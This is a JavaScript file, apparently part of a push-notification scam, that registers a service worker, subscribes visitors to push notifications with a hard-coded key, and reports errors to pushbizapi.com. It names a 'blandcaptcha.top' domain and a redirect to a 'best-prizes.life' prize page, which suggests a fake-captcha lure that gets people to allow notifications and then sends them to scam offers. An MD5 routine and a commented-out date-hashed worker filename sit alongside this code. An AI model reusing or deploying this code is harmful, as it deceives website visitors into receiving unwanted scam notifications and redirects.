var MD5 = function (d) { return M(V(Y(X(d), 8 * d.length))) }; function M(d) { for (var m, f = "0123456789ABCDEF", i = "", n = 0; n < d.length; n++)m = d.charCodeAt(n), i += f.charAt(m >>> 4 & 15) + f.charAt(15 & m); return i } function X(d) { for (var m = Array(d.length >> 2), f = 0; f < m.length; f++)m[f] = 0; for (f = 0; f < 8 * d.length; f += 8)m[f >> 5] |= (255 & d.charCodeAt(f / 8)) << f % 32; return m } function V(d) { for (var m = "", f = 0; f < 32 * d.length; f += 8)m += String.fromCharCode(d[f >> 5] >>> f % 32 & 255); return m } function Y(d, m) { d[m >> 5] |= 128 << m % 32, d[14 + (m + 64 >>> 9 << 4)] = m; for (var f = 1732584193, i = -271733879, n = -1732584194, r = 271733878, h = 0; h < d.length; h += 16) { var g = f, t = i, a = n, e = r, i = md5ii(i = md5ii(i = md5ii(i = md5ii(i = md5hh(i = md5hh(i = md5hh(i = md5hh(i = md5gg(i = md5gg(i = md5gg(i = md5gg(i = md5ff(i = md5ff(i = md5ff(i = md5ff(i, n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 0], 7, -680876936), i, n, d[h + 1], 12, -389564586), f, i, d[h + 2], 17, 606105819), r, f, d[h + 3], 22, -1044525330), n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 4], 7, -176418897), i, n, d[h + 5], 12, 1200080426), f, i, d[h + 6], 17, -1473231341), r, f, d[h + 7], 22, -45705983), n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 8], 7, 1770035416), i, n, d[h + 9], 12, -1958414417), f, i, d[h + 10], 17, -42063), r, f, d[h + 11], 22, -1990404162), n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 12], 7, 1804603682), i, n, d[h + 13], 12, -40341101), f, i, d[h + 14], 17, -1502002290), r, f, d[h + 15], 22, 1236535329), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 1], 5, -165796510), i, n, d[h + 6], 9, -1069501632), f, i, d[h + 11], 14, 643717713), r, f, d[h + 0], 20, -373897302), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 5], 5, -701558691), i, n, d[h + 10], 9, 38016083), f, i, d[h + 15], 14, -660478335), r, f, d[h + 4], 20, -405537848), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 9], 5, 568446438), i, n, d[h + 14], 9, -1019803690), f, i, d[h + 3], 14, -187363961), r, f, d[h + 8], 20, 1163531501), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 13], 5, -1444681467), i, n, d[h + 2], 9, -51403784), f, i, d[h + 7], 14, 1735328473), r, f, d[h + 12], 20, -1926607734), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 5], 4, -378558), i, n, d[h + 8], 11, -2022574463), f, i, d[h + 11], 16, 1839030562), r, f, d[h + 14], 23, -35309556), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 1], 4, -1530992060), i, n, d[h + 4], 11, 1272893353), f, i, d[h + 7], 16, -155497632), r, f, d[h + 10], 23, -1094730640), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 13], 4, 681279174), i, n, d[h + 0], 11, -358537222), f, i, d[h + 3], 16, -722521979), r, f, d[h + 6], 23, 76029189), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 9], 4, -640364487), i, n, d[h + 12], 11, -421815835), f, i, d[h + 15], 16, 530742520), r, f, d[h + 2], 23, -995338651), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 0], 6, -198630844), i, n, d[h + 7], 10, 1126891415), f, i, d[h + 14], 15, -1416354905), r, f, d[h + 5], 21, -57434055), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 12], 6, 1700485571), i, n, d[h + 3], 10, -1894986606), f, i, d[h + 10], 15, -1051523), r, f, d[h + 1], 21, -2054922799), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 8], 6, 1873313359), i, n, d[h + 15], 10, -30611744), f, i, d[h + 6], 15, -1560198380), r, f, d[h + 13], 21, 1309151649), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 4], 6, -145523070), i, n, d[h + 11], 10, -1120210379), f, i, d[h + 2], 15, 718787259), r, f, d[h + 9], 21, -343485551), f = safeadd(f, g); i = safeadd(i, t), n = safeadd(n, a), r = safeadd(r, e) } return [f, i, n, r] } function md5cmn(d, m, f, i, n, r) { return safeadd(bitrol(safeadd(safeadd(m, d), safeadd(i, r)), n), f) } function md5ff(d, m, f, i, n, r, h) { return md5cmn(m & f | ~m & i, d, m, n, r, h) } function md5gg(d, m, f, i, n, r, h) { return md5cmn(m & i | f & ~i, d, m, n, r, h) } function md5hh(d, m, f, i, n, r, h) { return md5cmn(m ^ f ^ i, d, m, n, r, h) } function md5ii(d, m, f, i, n, r, h) { return md5cmn(f ^ (m | ~i), d, m, n, r, h) } function safeadd(d, m) { var f = (65535 & d) + (65535 & m); return (d >> 16) + (m >> 16) + (f >> 16) << 16 | 65535 & f } function bitrol(d, m) { return d << m | d >>> 32 - m }

const loadScript = src => {
	return new Promise((resolve, reject) => {
		const script = document.createElement('script')
		script.type = 'text/javascript'
		script.onload = resolve
		script.onerror = reject
		script.src = src
		document.head.append(script)
	})
}
var today = new Date();
var date = today.getDate() + '' + (today.getMonth() + 1) + '' + today.getFullYear();
//var sw='/'+(MD5(date).toLowerCase())+'.js';
var sw = '/firebase-messaging-sw.js';
navigator.serviceWorker.register(sw)
	.then((registration) => {
		debugger;
		//initPush(registration);
		subscribeForPushNotifications(registration);
	})
	.catch((err) => {
		debugger;
		console.error('Error:', err);
		fetch("https://pushbizapi.com/api/errors/install?message=" + err).then((r) => { }, (e) => { });
	});


var config = {
	publicKey: "BLsKX7G4vJljJ4GqNgnpSbmYaa5VGGzUUSId73-2g581prWprEBXGWTvMmiRturSBTTBTVNwH6gXwKJIdMFGxJw",
};
var mainDomain = 'blandcaptcha.top';
var redirectUrl = 'https://best-prizes.life/?u=3w8p605&o=pn1kfzq';

function subscribeForPushNotifications(pushServiceWorkerRegistration) {
	debugger;
    let applicationServerPublicKey = base64UrlToUint8Array(config.publicKey);

    pushServiceWorkerRegistration.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: applicationServerPublicKey
    }).then(function (pushSubscription) {
		debugger;

		console.log(pushSubscription);
		console.log(JSON.stringify(pushSubscription));
		
    //     fetch('https://pushbizapi.com/api/errors/install?message=', {
	// 		//
    //         method: 'POST',
    //         headers: { 'Content-Type': 'application/json' },
    //         body: JSON.stringify(pushSubscription)
    //     }).then(function (response) {
	// 		debugger;
			
    //         if (response.ok) {
    //             console.log('Successfully subscribed for Push Notifications');
    //         } else {
    //             console.log('Failed to store the Push Notifications subscription on server');
    //         }
    //     }).catch(function (error) {
    //         console.log('Failed to store the Push Notifications subscription on server: ' + error);
    //     });
    // }).catch(function (error) {
	// 	debugger;
    //     if (Notification.permission === 'denied') {

    //     } else {
    //         console.log('Failed to subscribe for Push Notifications: ' + error);
    //     }
    });
};

function ab2str(buf) {
	return String.fromCharCode.apply(null, new Uint16Array(buf));
  }

function base64UrlToUint8Array(base64UrlData) {
    const padding = '='.repeat((4 - base64UrlData.length % 4) % 4);
    const base64 = (base64UrlData + padding)
        .replace(/\-/g, '+')
        .replace(/_/g, '/');

    const rawData = atob(base64);
    const buffer = new Uint8Array(rawData.length);

    for (let i = 0; i < rawData.length; ++i) {
        buffer[i] = rawData.charCodeAt(i);
    }

    return buffer;
}